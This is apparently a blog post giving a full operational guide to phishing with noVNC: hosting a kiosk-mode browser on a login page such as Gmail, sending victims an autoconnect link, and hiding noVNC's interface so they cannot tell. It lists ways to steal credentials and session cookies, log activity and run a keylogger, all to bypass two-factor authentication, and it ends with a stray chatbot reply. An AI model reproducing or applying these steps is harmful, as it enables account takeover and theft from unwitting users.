---
layout: post
title: Exploiting noVNC for 2FA Bypass
date: 2025-02-07
categories: [Exploits]
tags: [Exploits, noVNC, 2FA Bypass]
permalink: /posts/Exploiting-noVNC-for-2FA-Bypass/
image:  
  path: /assets/img/pfp.png
---


```markdown
# Using noVNC for Credential Acquisition and Bypassing 2FA

noVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.

So, how can we use noVNC to acquire credentials and bypass 2FA? We set up a server with noVNC, start Chromium (or any other browser) in Kiosk mode, and direct it to the desired website for user authentication (e.g., accounts.google.com). By sending the link to the target user, when they click on the URL, they will access the VNC session without realizing it. And since we’ve already configured Chromium in Kiosk mode, the user experience will be just a web page, as expected.

## Exploitation Possibilities

The exploitation possibilities of this method are vast:

- Inject JS into the browser
- Use an HTTP proxy connected to the browser to log all activities
- Terminate the VNC session after user authentication
- Capture the browser session token (Right-click > Inspect > Application > Cookies) after the user disconnects
- Run a background keylogger
- Or get creative and find other approaches (remember, the server is yours).

## noVNC Setup and Demonstration

### Deploy a Kali Linux Instance

Use any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.

### Install TigerVNC

First, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.

```shell
sudo apt update
sudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer
```

### Set Up a VNC Password

```shell
vncpasswd
```

On Kali Linux, I didn’t need to create the `xstartup` file, but if you encounter any errors, you can configure it manually.

```shell
nano ~/.vnc/xstartup
```

Paste or write the following:

```bash
#!/bin/sh
xrdb "$HOME/.Xresources"
xsetroot -solid grey
x-terminal-emulator -geometry 80x24+10+10 -ls -title "$VNCDESKTOP Desktop" &
x-window-manager &
# Fix to make GNOME work
export XKL_XMODMAP_DISABLE=1
/etc/X11/Xsession
```

Add execution permissions:

```shell
chmod +x ~/.vnc/xstartup
```

Now restart the VNC server, remembering that you will choose the screen size settings according to your needs. noVNC automatically adjusts to the browser's screen size, but do your own testing.

```shell
vncserver -depth 32 -geometry 1920x1080
```

### Download and Run noVNC

```shell
git clone https://github.com/novnc/noVNC.git
```

OR

```shell
apt install novnc
```

Now run noVNC locally or publicly; here are the commands.

In some cases, you will need to configure SSH to run on localhost.

First, check which port your TigerVNC server is running on:

```shell
vncserver -list
```

Example: 5901, 5902, 5903, etc.

Run the commands below for each purpose.

- To run noVNC:

```shell
./noVNC/utils/novnc_proxy --vnc localhost:5901
```

- To set up an SSH tunnel:

```shell
ssh -L 6080:127.0.0.1:6080 root@server
```

- To run publicly using port 8081:

```shell
ufw allow http
./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 8081
```

### Accessing VNC and Running the Browser in Kiosk Mode

Now access your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.

```shell
chromium --no-sandbox --app=https://gmail.com --kiosk
```

### How to Send the URL to the "Victim" to Connect Automatically

```shell
http://127.0.0.1:6080/vnc.html?autoconnect=true&password=YOUR-PASSWORD
```

The `autoconnect=true&password=VNCPASSWORD` will make the user authenticate automatically. If you want to rename the query parameter, you can modify the `vnc.html` file.

### Modifying the CSS to Remove Visual Elements

noVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.

Open `vnc.html`, find the `divs` below, and add the CSS style shown.

```html
<!-- Hide unnecessary items -->
<div id="noVNC_control_bar_anchor" class="noVNC_vcenter" style="display:none;">
<div id="noVNC_status" style="display:none"></div>

<!-- Makes the loading page white -->
<div id="noVNC_transition" style="background-color:white;color:white">
```

## Important Notes

- You are giving remote access to your machine! It should not have anything valuable stored on it.
- Any logged data should likely be sent to a remote machine.
- Do not use the root account. You should set up a restricted user account that uses the VNC service.
- You should also configure the Kiosk mode more restrictively.
```

This combines all the Markdown text, including proper code blocks for shell commands and HTML. You can now paste it directly into your Markdown file or editor. Let me know if you need any further adjustments!
